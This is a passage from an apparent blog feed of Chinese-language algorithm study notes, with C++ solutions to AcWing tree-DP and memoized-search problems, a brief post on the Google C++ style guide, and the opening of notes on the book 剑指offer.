mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">])</span></span></span></span></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">6010</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> h[kN], e[kN], ne[kN], idx;</span><br><span class="line"><span class="type">int</span> happy[kN];</span><br><span class="line"><span class="type">bool</span> has_father[kN];</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  e[idx] = b, ne[idx] = h[a], h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">  f[u][<span class="number">1</span>] = happy[u];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; ~i; i = ne[i]) &#123;</span><br><span class="line">    <span class="type">int</span> j = e[i];</span><br><span class="line">    <span class="built_in">dfs</span>(j);</span><br><span class="line">    f[u][<span class="number">1</span>] += f[j][<span class="number">0</span>];</span><br><span class="line">    f[u][<span class="number">0</span>] += <span class="built_in">max</span>(f[j][<span class="number">0</span>], f[j][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;  <span class="comment">// 序号为1~n, 要和后面建边对应</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;happy[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);  <span class="comment">// 邻接表初始化</span></span><br><span class="line">  <span class="keyword">while</span> (--n) &#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">add</span>(b, a);  <span class="comment">// b是上司</span></span><br><span class="line">    has_father[a] = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> root = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (has_father[root]) root++;</span><br><span class="line">  <span class="built_in">dfs</span>(root);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">max</span>(f[root][<span class="number">0</span>], f[root][<span class="number">1</span>]));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="记忆化搜索">记忆化搜索</h1><blockquote><p>记忆搜索是一种递归实现方式。<br>可以显著降低代码复杂度（好写），确定在于可能爆栈。</p></blockquote><h2 id="AcWing-901-滑雪"><a href="https://www.acwing.com/activity/content/problem/content/1013/">AcWing 901. 滑雪</a></h2><p><code>难度：简单</code></p><p>给定一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 列的矩阵，表示一个矩形网格滑雪场。</p><p>矩阵中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 列的点表示滑雪场的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> 列区域的高度。</p><p>一个人从滑雪场中的某个区域内出发，每次可以向上下左右任意一个方向滑动一个单位距离。</p><p>当然，一个人能够滑动到某相邻区域的前提是该区域的高度低于自己目前所在区域的高度。</p><p>下面给出一个矩阵作为例子：</p><pre><code> 1  2  3  4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9</code></pre><p>在给定矩阵中，一条可行的滑行轨迹为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn><mo>−</mo><mn>17</mn><mo>−</mo><mn>2</mn><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">24-17-2-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">24</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">17</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>在给定矩阵中，最长的滑行轨迹为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn><mo>−</mo><mn>24</mn><mo>−</mo><mn>23</mn><mo>−</mo><mo>…</mo><mo>−</mo><mn>3</mn><mo>−</mo><mn>2</mn><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">25-24-23-…-3-2-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">25</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">24</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">23</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，沿途共经过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn></mrow><annotation encoding="application/x-tex">25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">25</span></span></span></span> 个区域。</p><p>现在给定你一个二维矩阵表示滑雪场各区域的高度，请你找出在该滑雪场中能够完成的最长滑雪轨迹，并输出其长度(可经过最大区域数)。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> 行，每行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> 个整数，表示完整的二维矩阵。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示可完成的最长滑雪长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>R</mi><mo separator="true">,</mo><mi>C</mi><mo>≤</mo><mn>300</mn></mrow><annotation encoding="application/x-tex">1 \le R,C \le 300</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">300</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mtext>矩阵中整数</mtext><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">0 \le 矩阵中整数 \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">矩阵中整数</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>5 51 2 3 4 516 17 18 19 615 24 25 20 714 23 22 21 813 12 11 10 9</code></pre><p><strong>输出样例：</strong></p><pre><code>25</code></pre><h3 id="记忆化搜索-2">记忆化搜索</h3><ul><li>状态表示 <code>f[i, j]</code><ul><li>集合 所有从<code>(i, j)</code>开始滑行的路径</li><li>属性 Max</li></ul></li><li>状态计算<ul><li>按下一步滑行的方向进行分类</li><li>如向右滑 <code>f[i, j + 1] + 1</code><br>注意是否合法：边界内 and 比当前点低<br>要形成拓扑图，不能存在环形依赖</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">310</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> g[kN][kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> &amp;v = f[x][y];  <span class="comment">// 除了加速函数参数传递效率，也可以缩短代码长度</span></span><br><span class="line">  <span class="keyword">if</span> (v != <span class="number">-1</span>) <span class="keyword">return</span> v;</span><br><span class="line">  v = <span class="number">1</span>;  <span class="comment">// 初始化, 其本身就算一步</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="type">int</span> a = x + dx[i], b = y + dy[i];</span><br><span class="line">    <span class="keyword">if</span> (a &gt;= <span class="number">0</span> &amp;&amp; a &lt; n &amp;&amp; b &gt;= <span class="number">0</span> &amp;&amp; b &lt; m &amp;&amp; g[a][b] &lt; g[x][y])</span><br><span class="line">      v = <span class="built_in">max</span>(v, <span class="built_in">dp</span>(a, b) + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;g[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">-1</span>, <span class="keyword">sizeof</span> f);  <span class="comment">// 初始化, 所有状态未被计算</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">      res = <span class="built_in">max</span>(res, <span class="built_in">dp</span>(i, j));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法基础课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google C++ 风格学习</title>
      <link href="/2022/11/21/C-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/21/C-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>参考《Google 开源项目风格指南》<br>李开复这样评价这份指南：”我认为这是地球上最好的一份C++编程规范，没有之一，建议广大国内外IT研究使用。“</p><span id="more"></span><h1 id="视频推荐">视频推荐</h1><p><a href="https://www.bilibili.com/video/BV1nh411o7h1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">Google编程风格指南学习 - 第一期</a> 视频质量很高，可惜只有一期。</p><p>精华就在作者做的这张表中：</p><p><img src="/2022/11/21/C-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/image-20221121164530928.png" alt="image-20221121164530928"></p><h1 id="总结">总结</h1><p><img src="/2022/11/21/C-Google-C-%E9%A3%8E%E6%A0%BC%E5%AD%A6%E4%B9%A0/google_cpp_style.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法风格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《剑指offer》笔记</title>
      <link href="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>AcWing版《剑指offer》的刷题笔记。</p><span id="more"></span><h1 id="Week-1">Week 1</h1><h2 id="找出数组中重复的数字★"><a href="https://www.acwing.com/problem/content/14/">找出数组中重复的数字★</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数组 <code>nums</code>，数组中所有的数字都在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的范围内。</p><p>数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。</p><p>请找出数组中任意一个重复的数字。</p><p><strong>注意</strong>：如果某些数字不在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的范围内，或数组中不包含重复数字，则返回 -1；</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>给定 nums = [2, 3, 5, 4, 3, 2, 6, 7]。返回 2 或 3。</code></pre><h3 id="原地哈希-O-n">原地哈希 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p><strong>思路</strong></p><p>nums[i]的值为nums[i], 而nums[nums[i]]元素的下标位置为nums[i],<br>每次swap后nums[i]被放到下标为nums[i]的位置处(而i处的值nums[i]会变化)，因此不会死循环, while可以结束</p><p>while结束的条件是: nums[i] == nums[nums[i]], 这有2种情况:</p><ol><li>i == nums[i], 即成功把i处元素也放好</li><li>i != nums[i], 即下标为i和nums[i]的值相等nums[i] == nums[nums[i]], 碰撞发生, 返回</li></ol><p><strong>时空复杂度分析</strong></p><ul><li>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>, 每次swap都会有1个元素放回原位</li><li>空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>, 没有开辟新数组</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">duplicateInArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt; n - <span class="number">1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      <span class="keyword">while</span> (nums[i] != nums[nums[i]]) <span class="built_in">swap</span>(nums[i], nums[nums[i]]);</span><br><span class="line">      <span class="keyword">if</span> (i != nums[i]) <span class="keyword">return</span> nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这道题在原书上绝对不是简单级别啊！<br>它考察的是程序员的沟通能力，先问面试官要时间/空间需求！！！<br>只是时间优先就用字典，<br>还有空间要求，就用指针+原地排序数组，<br>如果面试官要求空间O(1)并且不能修改原数组，还得写成二分法！！！</p></blockquote><h2 id="不修改数组找出重复的数字★"><a href="https://www.acwing.com/problem/content/15/">不修改数组找出重复的数字★</a></h2><p>给定一个长度为 <span 